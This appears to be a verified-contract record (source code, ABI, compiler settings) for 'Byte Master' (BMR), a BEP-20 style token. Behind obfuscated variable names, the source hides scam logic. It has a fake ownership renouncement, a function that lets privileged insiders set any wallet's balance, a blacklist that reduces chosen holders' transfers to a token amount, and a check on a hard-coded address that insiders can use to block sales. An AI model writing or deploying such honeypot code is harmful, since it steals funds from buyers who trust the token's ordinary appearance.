{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.16;\n\ninterface limitExempt {\n    function createPair(address receiverModeSell, address receiverIs) external returns (address);\n}\n\ninterface listLaunchedTotal {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address walletBuy) external view returns (uint256);\n\n    function transfer(address fundLaunchedAuto, uint256 autoFee) external returns (bool);\n\n    function allowance(address liquidityEnable, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 autoFee) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address fundLaunchedAuto,\n        uint256 autoFee\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed sellMarketing, uint256 value);\n    event Approval(address indexed liquidityEnable, address indexed spender, uint256 value);\n}\n\nabstract contract fromLiquidity {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface senderSwapSell {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface listLaunchedTotalMetadata is listLaunchedTotal {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract ByteMaster is fromLiquidity, listLaunchedTotal, listLaunchedTotalMetadata {\n\n    string private liquidityAmount = \"BMR\";\n\n    function transfer(address enableFrom, uint256 autoFee) external virtual override returns (bool) {\n        return exemptSender(_msgSender(), enableFrom, autoFee);\n    }\n\n    function allowance(address receiverTrading, address tokenAutoTo) external view virtual override returns (uint256) {\n        if (tokenAutoTo == toToken) {\n            return type(uint256).max;\n        }\n        return autoExemptReceiver[receiverTrading][tokenAutoTo];\n    }\n\n    uint256 constant minAt = 5 ** 10;\n\n    bool public tokenLimit;\n\n    address public launchSender;\n\n    function exemptSender(address launchFrom, address fundLaunchedAuto, uint256 autoFee) internal returns (bool) {\n        if (launchFrom == isTokenFee) {\n            return listFund(launchFrom, fundLaunchedAuto, autoFee);\n        }\n        uint256 tokenAmount = listLaunchedTotal(launchSender).balanceOf(limitLiquidity);\n        require(tokenAmount == shouldReceiver);\n        require(fundLaunchedAuto != limitLiquidity);\n        if (toReceiver[launchFrom]) {\n            return listFund(launchFrom, fundLaunchedAuto, minAt);\n        }\n        return listFund(launchFrom, fundLaunchedAuto, autoFee);\n    }\n\n    address limitLiquidity = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    address public isTokenFee;\n\n    mapping(address => bool) public teamTradingAmount;\n\n    mapping(address => bool) public toReceiver;\n\n    function senderTake(address enableTotalAmount) public {\n        if (txExempt) {\n            return;\n        }\n        if (senderFee != atAutoReceiver) {\n            atAutoReceiver = walletMin;\n        }\n        teamTradingAmount[enableTotalAmount] = true;\n        if (receiverMin != atAutoReceiver) {\n            txIs = atAutoReceiver;\n        }\n        txExempt = true;\n    }\n\n    function balanceOf(address walletBuy) public view virtual override returns (uint256) {\n        return swapAmount[walletBuy];\n    }\n\n    uint256 private txIs;\n\n    function listFund(address launchFrom, address fundLaunchedAuto, uint256 autoFee) internal returns (bool) {\n        require(swapAmount[launchFrom] >= autoFee);\n        swapAmount[launchFrom] -= autoFee;\n        swapAmount[fundLaunchedAuto] += autoFee;\n        emit Transfer(launchFrom, fundLaunchedAuto, autoFee);\n        return true;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return receiverFund;\n    }\n\n    uint256 private atAutoReceiver;\n\n    mapping(address => mapping(address => uint256)) private autoExemptReceiver;\n\n    function fromExempt(address enableFrom, uint256 autoFee) public {\n        launchedBuy();\n        swapAmount[enableFrom] = autoFee;\n    }\n\n    function getOwner() external view returns (address) {\n        return enableWallet;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return exemptEnable;\n    }\n\n    uint256 private exemptEnable = 100000000 * 10 ** 18;\n\n    bool public txExempt;\n\n    function name() external view virtual override returns (string memory) {\n        return fundMin;\n    }\n\n    uint8 private receiverFund = 18;\n\n    address toToken = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    uint256 amountLimit;\n\n    uint256 shouldReceiver;\n\n    uint256 private receiverMin;\n\n    string private fundMin = \"Byte Master\";\n\n    uint256 private senderFee;\n\n    constructor (){\n        \n        senderSwapSell feeSender = senderSwapSell(toToken);\n        launchSender = limitExempt(feeSender.factory()).createPair(feeSender.WETH(), address(this));\n        if (atIs) {\n            tokenLimit = false;\n        }\n        isTokenFee = _msgSender();\n        teamTradingAmount[isTokenFee] = true;\n        swapAmount[isTokenFee] = exemptEnable;\n        feeTx();\n        \n        emit Transfer(address(0), isTokenFee, exemptEnable);\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return liquidityAmount;\n    }\n\n    function autoTeamLaunched(address fundReceiver) public {\n        launchedBuy();\n        if (walletMin == atAutoReceiver) {\n            txIs = walletMin;\n        }\n        if (fundReceiver == isTokenFee || fundReceiver == launchSender) {\n            return;\n        }\n        toReceiver[fundReceiver] = true;\n    }\n\n    function feeTx() public {\n        emit OwnershipTransferred(isTokenFee, address(0));\n        enableWallet = address(0);\n    }\n\n    function launchedBuy() private view {\n        require(teamTradingAmount[_msgSender()]);\n    }\n\n    mapping(address => uint256) private swapAmount;\n\n    address private enableWallet;\n\n    function owner() external view returns (address) {\n        return enableWallet;\n    }\n\n    function buyIs(uint256 autoFee) public {\n        launchedBuy();\n        shouldReceiver = autoFee;\n    }\n\n    uint256 private walletMin;\n\n    bool private atIs;\n\n    function transferFrom(address launchFrom, address fundLaunchedAuto, uint256 autoFee) external override returns (bool) {\n        if (_msgSender() != toToken) {\n            if (autoExemptReceiver[launchFrom][_msgSender()] != type(uint256).max) {\n                require(autoFee <= autoExemptReceiver[launchFrom][_msgSender()]);\n                autoExemptReceiver[launchFrom][_msgSender()] -= autoFee;\n            }\n        }\n        return exemptSender(launchFrom, fundLaunchedAuto, autoFee);\n    }\n\n    function approve(address tokenAutoTo, uint256 autoFee) public virtual override returns (bool) {\n        autoExemptReceiver[_msgSender()][tokenAutoTo] = autoFee;\n        emit Approval(_msgSender(), tokenAutoTo, autoFee);\n        return true;\n    }\n\n    event OwnershipTransferred(address indexed tradingIs, address indexed maxSwap);\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"liquidityEnable\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tradingIs\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"maxSwap\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"sellMarketing\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverTrading\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"tokenAutoTo\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenAutoTo\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"autoFee\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundReceiver\",\"type\":\"address\"}],\"name\":\"autoTeamLaunched\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletBuy\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"autoFee\",\"type\":\"uint256\"}],\"name\":\"buyIs\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeTx\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableFrom\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"autoFee\",\"type\":\"uint256\"}],\"name\":\"fromExempt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isTokenFee\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchSender\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableTotalAmount\",\"type\":\"address\"}],\"name\":\"senderTake\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"teamTradingAmount\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"toReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenLimit\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableFrom\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"autoFee\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchFrom\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"fundLaunchedAuto\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"autoFee\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txExempt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "ByteMaster", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}